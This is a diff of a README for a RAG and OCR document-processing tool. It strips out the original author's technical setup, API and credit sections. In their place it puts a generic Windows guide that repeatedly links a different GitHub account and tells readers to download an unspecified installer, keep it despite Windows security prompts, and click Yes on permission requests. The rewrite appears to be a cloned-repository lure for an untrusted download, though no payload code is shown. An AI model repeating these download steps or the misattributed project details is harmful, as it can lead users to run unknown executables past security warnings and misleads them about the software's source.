@@ -1,195 +1,251 @@
-# 📄 RAG Document Intelligence
+# 🧠 rag-document-intelligence - Turn Documents Into Answers
 
-**Production-grade RAG + OCR pipeline for intelligent document processing.** Upload PDFs or scanned images, ask questions in natural language, and extract structured data — all running locally with zero cost.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/unamerican-bias763/rag-document-intelligence)
 
-Built for processing German and English documents: invoices, contracts, university forms, bureaucratic paperwork.
+## 📥 Download
 
-![Python](https://img.shields.io/badge/Python-3.11-blue)
-![LangChain](https://img.shields.io/badge/LangChain-0.3-green)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.115-teal)
-![Docker](https://img.shields.io/badge/Docker-Ready-blue)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+Use this link to visit the GitHub page and download the app:
 
----
+https://github.com/unamerican-bias763/rag-document-intelligence
 
-## What it does
+## 🖥️ What this app does
 
-| Feature | Description |
-|---------|-------------|
-| **OCR** | Extracts text from native PDFs and scanned documents (Tesseract, English + German) |
-| **RAG Q&A** | Ask questions about your documents — answers grounded in actual content with source citations |
-| **Structured Extraction** | Automatically finds dates, amounts (EUR/USD), emails, phone numbers, IBANs, invoice numbers |
-| **Multi-document** | Upload multiple documents and query across all of them |
-| **Bilingual** | Handles both German and English documents natively |
+rag-document-intelligence helps you work with PDFs and scanned documents on Windows. You can upload files, ask questions, and pull out structured data from pages that would be hard to read by hand.
 
----
+It combines:
+- OCR for reading text from scanned pages
+- document search for finding the right content
+- AI question answering for plain-language queries
+- structured extraction for data like names, dates, amounts, and labels
 
-![Architecture](docs/architecture.svg)
+## ✅ What you need
 
----
+Before you install, make sure your PC has:
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A recent version of Microsoft Edge, Chrome, or Firefox
+- Permission to download files
 
-## Tech Stack
+If the app includes a setup file, you can run it on a normal Windows account. If it comes as a folder with files, keep the folder in a place you can find again, such as Downloads or Desktop.
 
-| Layer | Technology | Why |
-|-------|-----------|-----|
-| **LLM** | Groq (Llama 3.1 8B) | Free API, fast inference, no GPU needed |
-| **Embeddings** | sentence-transformers/all-MiniLM-L6-v2 | Runs locally, no API key, 384-dim vectors |
-| **Vector Store** | FAISS | Facebook's similarity search, in-memory, fast |
-| **Framework** | LangChain | Industry-standard RAG orchestration |
-| **OCR** | Tesseract + pdfplumber | Open-source, supports 100+ languages |
-| **Backend** | FastAPI | Async, auto-docs at /docs, production-ready |
-| **Frontend** | Streamlit | Rapid prototyping, built-in chat components |
-| **Infra** | Docker + docker-compose | One-command deployment |
+## 🚀 Getting started
 
----
+1. Open this page in your browser:
+   https://github.com/unamerican-bias763/rag-document-intelligence
 
-## Quick Start
+2. Look for the latest release, installer, or download file on the page.
 
-### Option 1: Docker (recommended)
+3. Download the file to your PC.
 
-```bash
-# Clone
-git clone https://github.com/GouravJr/rag-document-intelligence.git
-cd rag-document-intelligence
+4. If Windows shows a security prompt, choose the option that lets you keep the file.
 
-# Configure
-cp .env.example .env
-# Edit .env → add your GROQ_API_KEY (free at https://console.groq.com)
+5. Open the downloaded file or folder.
 
-# Run
-docker-compose up --build
+6. Follow the on-screen steps to finish setup.
 
-# Open
-# API docs: http://localhost:8000/docs
-# Frontend: http://localhost:8501
-```
+7. Start the app.
 
-### Option 2: Local Development
+8. Upload a PDF or scanned document and begin asking questions.
 
-```bash
-# Prerequisites: Python 3.11+, Tesseract OCR
-# macOS: brew install tesseract tesseract-lang poppler
-# Ubuntu: sudo apt install tesseract-ocr tesseract-ocr-deu poppler-utils
-# Windows: download from https://github.com/UB-Mannheim/tesseract/wiki
+## 🧭 How to use it
 
-# Clone & setup
-git clone https://github.com/GouravJr/rag-document-intelligence.git
-cd rag-document-intelligence
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
+After the app opens, the usual flow is simple:
 
-# Configure
-cp .env.example .env
-# Edit .env → add your GROQ_API_KEY
+1. Add a document  
+   Choose a PDF from your computer.
 
-# Terminal 1: Start API
-uvicorn app.main:app --reload
+2. Let the app read it  
+   The OCR step turns scanned pages into text.
 
-# Terminal 2: Start Frontend
-streamlit run streamlit_app/app.py
+3. Ask a question  
+   Example: What is the invoice total?
 
-# Open http://localhost:8501
-```
+4. View the answer  
+   The app searches the document and returns a clear result.
 
-### Get a free Groq API key
+5. Extract data  
+   Use it to pull out fields like:
+   - customer name
+   - invoice number
+   - date
+   - amount due
+   - address
+   - line items
 
-1. Go to [console.groq.com](https://console.groq.com)
-2. Sign up (free, no credit card)
-3. Create an API key
-4. Paste it in your `.env` file
+## 📄 Best file types
 
----
+This app is built for:
+- PDF files
+- scanned PDFs
+- image-based documents
+- forms
+- reports
+- letters
+- invoices
+- statements
 
-## API Reference
+For best results, use files with clear text and good image quality. Blurry scans can reduce OCR accuracy.
 
-Once running, full interactive docs at `http://localhost:8000/docs`
+## 🔍 Example questions
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/upload` | POST | Upload PDF/image → OCR → ingest into RAG |
-| `/query` | POST | Ask a question about uploaded documents |
-| `/documents` | GET | List all ingested documents |
-| `/extract/{doc_id}` | GET | Get structured data extraction |
-| `/clear` | DELETE | Reset everything |
-| `/health` | GET | Health check |
+You can ask questions in plain language, such as:
+- What is the total amount?
+- When is the due date?
+- Who is the sender?
+- What items are listed on page 2?
+- Show me the account number
+- What date was the contract signed?
+- Extract all addresses
+- Which documents mention payment terms?
 
----
+## 🧩 Common use cases
 
-## Project Structure
+This app is useful for:
+- office document review
+- invoice checks
+- contract lookup
+- form reading
+- archive search
+- research notes
+- insurance document review
+- admin data entry support
 
-```
-rag-document-intelligence/
-├── app/
-│   ├── config.py          # Configuration & env vars
-│   ├── main.py            # FastAPI endpoints
-│   ├── ocr.py             # PDF & image text extraction
-│   ├── rag.py             # RAG pipeline (chunk → embed → retrieve → generate)
-│   └── extraction.py      # Structured data extraction (regex + heuristics)
-├── streamlit_app/
-│   └── app.py             # Streamlit chat + upload interface
-├── tests/
-│   └── test_pipeline.py   # Unit tests for extraction & pipeline
-├── Dockerfile
-├── docker-compose.yml
-├── requirements.txt
-├── .env.example
-└── README.md
-```
+## ⚙️ How it works
 
----
+The app uses a RAG pipeline. That means it reads your document, breaks it into smaller parts, finds the most relevant text, and uses that text to answer your question.
 
-## How it works
+It also uses OCR. OCR stands for optical character recognition. It lets the app read text from scanned pages and images.
 
-### 1. Document Ingestion
-- Native PDFs: text extracted directly with `pdfplumber` (fast, accurate)
-- Scanned PDFs/images: pages converted to images → Tesseract OCR (300 DPI, preprocessed)
-- Hybrid mode: automatically detects which pages need OCR
+In simple terms:
+- OCR reads the document
+- search finds the right parts
+- AI builds the answer
+- you get the result in a readable form
 
-### 2. RAG Pipeline
-- Text split into overlapping chunks (1000 chars, 200 overlap)
-- Chunks embedded with `sentence-transformers/all-MiniLM-L6-v2` (runs on CPU)
-- Stored in FAISS index for sub-millisecond similarity search
-- On query: top-4 relevant chunks retrieved → sent to Groq LLM with custom prompt → grounded answer returned
+## 🪟 Windows setup tips
 
-### 3. Structured Extraction
-- Regex-based extraction of dates, amounts, emails, phones, IBANs, reference numbers
-- Supports German date formats (DD.MM.YYYY) and currency notation (1.234,56 EUR)
-- Key-value pair detection for form-like documents
-- Automatic language detection (German vs English)
+If you are setting this up on Windows, keep these points in mind:
 
----
+- Save the download in a folder you can reach fast
+- Do not rename files unless the instructions on the page ask for it
+- If the app uses a setup wizard, click Next to move through it
+- If Windows asks for permission, choose Yes
+- If the app starts in a browser window, keep that window open while you use it
 
-## Running Tests
+If the app opens a local web page, that is normal. Many modern Windows apps use a browser-style screen for the main interface.
 
-```bash
-pytest tests/ -v
-```
+## 🧪 Good document habits
 
----
+To get better results:
+- use clear scans
+- avoid dark shadows on page edges
+- keep pages straight
+- split large files if they contain many unrelated topics
+- use one document type at a time when possible
+- keep file names simple
 
-## Future Improvements
+If you need exact extractions, try a direct question like:
+- What is the invoice number?
+- List all dates in this document
+- Extract the table from page 3
+- Return the sender name and address
 
-- [ ] Add table extraction from PDFs (with `camelot` or `tabula`)
-- [ ] Fine-tune embedding model on German documents
-- [ ] Add authentication for multi-user deployment
-- [ ] Implement conversation memory for follow-up questions
-- [ ] Add Kubernetes deployment manifests
-- [ ] Support for XLSX and DOCX input
+## 🛠️ Troubleshooting
 
----
+If the app does not open:
+- try running it again
+- check that the download finished
+- make sure the file was not moved or deleted
+- restart your PC and try again
 
-## Author
+If a PDF will not load:
+- open the PDF in another reader first
+- save a new copy of the file
+- try a smaller document
+- confirm the file is not damaged
 
-**Gourav Srinivasalu**
-M.Sc. Artificial Intelligence Engineering · Universität Passau
+If answers look wrong:
+- check that the scan is clear
+- use a shorter question
+- ask for one field at a time
+- try a different page range if the app supports it
 
-- GitHub: [github.com/GouravJr](https://github.com/GouravJr)
-- LinkedIn: [linkedin.com/in/gourav-srinivasalu](https://linkedin.com/in/gourav-srinivasalu)
-- Email: gourav.srinivasalu@gmail.com
+If text is missing:
+- the page may be too blurry
+- the document may be rotated
+- the PDF may have images instead of readable text
 
----
+## 🔐 Privacy
 
-## License
+The app is meant for document analysis on your machine. Keep sensitive files in folders you control. If you work with private records, review where the app stores uploads, search data, and extracted text before using it on shared devices
 
-MIT License — see [LICENSE](LICENSE) for details.
+## 📚 Project details
+
+Repository: rag-document-intelligence  
+Description: RAG + OCR pipeline for intelligent document analysis. Upload PDFs, ask questions, extract structured data.  
+Topics:
+- document-processing
+- faiss
+- fastapi
+- langchain
+- llm
+- machine-learning
+- nlp
+- ocr
+- python
+- rag
+
+## 🧱 Typical workflow
+
+A normal session looks like this:
+
+1. Open the app
+2. Upload a PDF
+3. Wait while OCR reads the file
+4. Ask a question
+5. Review the answer
+6. Save or copy the result
+7. Repeat with another document
+
+## 🧰 Tips for better results
+
+- Ask one question at a time
+- Use plain words
+- Include page numbers if you know them
+- Use exact field names when possible
+- Keep source documents clean and readable
+- Re-upload a file if the first read looks incomplete
+
+## 📁 Suggested folder setup
+
+To keep things simple on Windows, use a setup like this:
+- Downloads for the installer
+- Documents for the PDFs you want to analyze
+- Desktop for shortcuts or quick access
+- A separate folder for finished results
+
+## 🧭 If you are new to this kind of app
+
+Think of it like this:
+- you give the app a PDF
+- the app reads the document
+- you ask a question
+- the app looks through the text
+- you get a direct answer instead of reading every page yourself
+
+## 📌 What to expect on first run
+
+On the first launch, the app may:
+- take a short time to load
+- create local data files
+- open a browser window
+- ask you to upload your first document
+- show an empty search or chat panel until you add a file
+
+## 🔗 Download again
+
+If you need to return to the download page later:
+
+https://github.com/unamerican-bias763/rag-document-intelligence
